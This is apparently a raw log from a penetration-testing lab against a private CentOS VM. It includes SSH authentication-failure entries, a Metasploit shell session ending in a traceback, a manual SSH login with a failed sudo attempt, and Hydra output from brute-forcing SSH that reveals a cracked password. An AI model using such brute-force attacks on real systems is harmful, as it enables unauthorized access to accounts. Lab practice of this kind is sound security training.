/var/log/secure-20260517:May 16 07:20:58 centos sshd[3768]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=alemao
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3809]: Failed password for alemao from 192.168.136.128 port 51810 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3784]: Failed password for alemao from 192.168.136.128 port 51782 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3811]: Failed password for alemao from 192.168.136.128 port 51812 ssh2
exit

[*] 192.168.136.130 - Command shell session 1 closed.  Reason: Died from EOFError
#<Thread:0x000055663f64d340@/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:93 run> terminated with exception (report_on_exception is true):
Traceback (most recent call last):
	4: from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
	3: from /usr/share/metasploit-framework/lib/msf/base/sessions/command_shell.rb:315:in `block in _interact_ring'
	2: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/io/ring_buffer.rb:218:in `wait'
	1: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/io/ring_buffer.rb:208:in `select'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/io/ring_buffer.rb:208:in `select': closed stream (IOError)

Varredura 2

azureuser@Kali:~$ ssh alemao@192.168.136.130
alemao@192.168.136.130's password: 
Last failed login: Sun May 17 10:25:45 -03 2026 from 192.168.136.128 on ssh:notty
There were 18 failed login attempts since the last successful login.
Last login: Sun May 17 07:48:35 2026 from 192.168.136.128
[alemao@centos ~]$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for alemao: 
alemao is not in the sudoers file.  This incident will be reported.
[alemao@centos ~]$ exit
logout
Connection to 192.168.136.130 closed.

Xhydra

Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2026-05-16 07:20:35
[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:12/p:21), ~16 tries per task
[DATA] attacking ssh://192.168.136.130:22/
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[22][ssh] host: 192.168.136.130   login: alemao   password: schalke04
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2026-05-16 07:21:15
<finished>

